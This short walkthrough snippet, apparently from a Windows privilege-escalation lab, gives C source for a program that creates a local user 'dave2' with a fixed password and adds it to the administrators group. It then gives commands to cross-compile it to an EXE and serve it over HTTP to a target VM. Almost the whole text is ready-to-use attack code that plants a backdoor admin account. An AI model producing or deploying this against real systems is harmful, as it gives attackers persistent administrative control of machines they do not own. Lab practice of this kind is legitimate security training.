# adduser.c
Create adduser.c (creates local admin dave2 with password Password123!):

/* adduser.c */
#include <stdlib.h>
int main() {
  system("net user dave2 Password123! /add");
  system("net localgroup administrators dave2 /add");
  return 0;
}


Cross-compile to a Windows x64 EXE (if you have mingw-w64):

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe


(If you don't have mingw, see alternate methods below.)

Serve the EXE with a simple HTTP server from the folder containing adduser.exe:

python3 -m http.server 80


Keep this running while you work on the Windows VM.
